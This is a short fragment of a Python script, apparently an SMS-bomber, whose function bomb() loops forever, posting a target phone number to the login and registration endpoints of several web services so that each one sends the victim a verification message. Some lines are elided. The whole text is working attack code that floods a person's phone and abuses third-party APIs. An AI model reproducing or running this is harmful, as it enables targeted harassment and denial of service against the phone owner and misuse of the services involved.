...
def bomb():
	...
	maj = {"mobile":phone}
	while True:
		print(requests.post('https://api.malichii.com/front/login' , headers=mah , json=maj))
		...
		print(requests.post(f'https://api.anargift.com/api/people/auth' , headers=aah , json=aaj))
		...
		print(requests.post('https://www.simkhanapi.ir/api/users/register' , headers=sih , json=sij))
